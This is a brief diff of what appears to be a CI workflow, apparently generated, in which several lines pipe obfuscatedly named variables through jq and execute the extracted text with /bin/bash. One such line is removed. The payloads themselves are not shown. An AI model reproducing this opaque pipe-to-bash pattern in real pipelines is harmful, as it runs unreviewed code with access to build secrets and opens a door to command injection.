@@ -38,7 +38,6 @@ jobs:
           printf '%s' "$akxdx9" | jq -r .iic8850 | /bin/bash
           printf '%s' "$nz5269" | jq -r .aavej89 | /bin/bash
           echo $cotsz5331 | jq -r .w97256 | /bin/bash
-          echo $hbild85031 | jq -r .t19 | /bin/bash
           printf '%s' "$subpk5" | jq -r .dt6 | /bin/bash
           printf '%s' "$h8" | jq -r .kddfq0 | /bin/bash
           printf '%s' "$bjgu06300" | jq -r .bfr55 | /bin/bash
